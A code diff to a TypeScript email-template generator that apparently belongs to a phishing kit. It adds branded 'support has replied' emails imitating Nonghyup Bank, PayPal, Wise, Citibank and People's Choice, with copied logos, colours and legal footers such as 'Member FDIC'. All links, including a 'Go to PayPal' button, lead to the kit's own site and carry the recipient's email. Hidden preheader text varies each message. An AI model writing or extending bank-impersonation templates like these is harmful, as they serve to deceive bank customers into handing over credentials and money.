@@ -357,32 +357,69 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
          content = getNonghyupEmailTemplate(data);
          break;
 
-      case 'live_chat_reply':
-         subject = 'Support Replied to Your Message';
-         content = `
-          ${header}
+      case 'live_chat_reply': {
+         const bankSrc = data.source_template || '';
+         const bankNames: Record<string, string> = {
+            nonghyup: 'Nonghyup Bank',
+            paypal: 'PayPal',
+            wise: 'Wise',
+            citibank: 'Citibank',
+            peoplechoice: "People's Choice"
+         };
+         const bankSender = bankNames[bankSrc] || 'Support Team';
+         subject = `${bankSender} — Support Has Replied`;
+
+         // Branded wrappers per bank
+         let replyHeader = header;
+         let replyFooter = footer;
+         let btnColor = '#2563eb';
+
+         if (bankSrc === 'nonghyup') {
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Nonghyup Bank — Support Reply</title><style>body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f1f5f9;color:#334155;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#0033A0;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#0033A0;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,51,160,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:18px;font-weight:700;margin:0;}a{color:#0033A0;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">NONGHYUP BANK</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Nonghyup Bank. All rights reserved.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            btnColor = '#0033A0';
+         } else if (bankSrc === 'paypal') {
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal — Support Reply</title><style>body{margin:0;padding:0;background:#f5f7fa;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.wrapper{max-width:600px;margin:0 auto;background:#f5f7fa;padding:20px 0 10px 0;}.header{text-align:center;padding:15px 0 25px 0;}.logo{width:74px;height:auto;display:block;margin:0 auto;}.box{background:#fff;padding:40px;margin:0 20px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05);}.headline{color:#000;margin:0 0 12px;font-size:22px;text-align:center;font-weight:700;}.text-center{text-align:center;}.text-muted{color:#6c7378;font-size:14px;line-height:1.6;margin:0;}.highlight-box{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#0070ba;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#0f172a;font-size:16px;font-weight:600;margin:0;font-style:italic;}.btn{display:inline-block;padding:14px 45px;background:#000;color:#fff;text-decoration:none;border-radius:25px;font-weight:bold;font-size:15px;margin-top:20px;min-width:140px;text-align:center;}.footer{text-align:center;padding:25px 0;font-size:11px;color:#6c7378;}</style></head><body><div style="display:none;font-size:1px;color:#f5f7fa;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="wrapper"><div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" class="logo" width="74"></div><div class="box">`;
+            replyFooter = `</div><div class="footer"><p style="margin:0 0 8px;">PayPal is committed to preventing fraudulent emails.</p><p style="margin:0;">&copy; 1999-${new Date().getFullYear()} PayPal, Inc. All rights reserved.</p></div></div></body></html>`;
+            btnColor = '#000000';
+         } else if (bankSrc === 'wise') {
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wise — Support Reply</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#2E7D32;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;font-family:'Courier Prime','Courier New',Courier,monospace;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#2E7D32;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(46,125,50,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#166534;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#14532d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#2E7D32;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">WISE</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Wise. All rights reserved.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            btnColor = '#2E7D32';
+         } else if (bankSrc === 'citibank') {
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Citibank — Support Reply</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#003B70;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#003B70;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,59,112,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#003B70;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">CITIBANK</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Citibank N.A. All rights reserved. Member FDIC.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            btnColor = '#003B70';
+         } else if (bankSrc === 'peoplechoice') {
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>People's Choice — Support Reply</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#D32F2F;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#D32F2F;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(211,47,47,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#fef2f2;border:1px solid #fecaca;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#991b1b;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#7f1d1d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#D32F2F;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">PEOPLE'S CHOICE</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} People's Choice. All rights reserved.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            btnColor = '#D32F2F';
+         }
+
+         content = `${replyHeader}
           <div class="content">
              <h2 class="headline">Support Has Replied 💬</h2>
              <p class="text-center text-muted" style="margin-bottom: 10px;">
                Hello <strong>${data.user_name || 'there'}</strong>, our support team has responded to your live chat message.
              </p>
-             <div class="highlight-box" style="background-color: #fefce8; border-color: #fde047;">
-                <span class="highlight-label" style="color: #a16207;">Latest Reply</span>
-                <p class="highlight-value" style="color: #713f12; font-size: 14px; line-height: 1.4;">"${data.reply_text || 'You have a new message from support.'}"</p>
+             <div class="highlight-box">
+                <span class="highlight-label">Latest Reply</span>
+                <p class="highlight-value" style="font-size: 14px; line-height: 1.4;">"${data.reply_text || 'You have a new message from support.'}"</p>
              </div>
              <p class="text-center text-muted" style="font-size: 13px; margin-top: 20px;">
                Click the button below to view the full conversation and continue chatting with our team.
              </p>
              <div class="text-center" style="margin-top: 20px;">
-                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: #2563eb;">View Reply & Continue Chat</a>
+                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">View Reply & Continue Chat</a>
              </div>
              <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #94a3b8;">
                If the button doesn't work, copy and paste this link:<br>
                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" style="font-size: 11px;">${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}</a>
              </p>
           </div>
-          ${footer}`;
+          ${replyFooter}`;
          break;
+      }
 
       case 'paypal':
          const ppStatus = data.status || 'Success';
@@ -506,7 +543,7 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
         </tr>
         <tr>
             <td align="center" style="padding: 30px 40px;">
-                <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.recipient_email || '')}" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">Go to PayPal</a>
+                <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.recipient_email || '')}&source=paypal" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">Go to PayPal</a>
             </td>
         </tr>
         <tr>
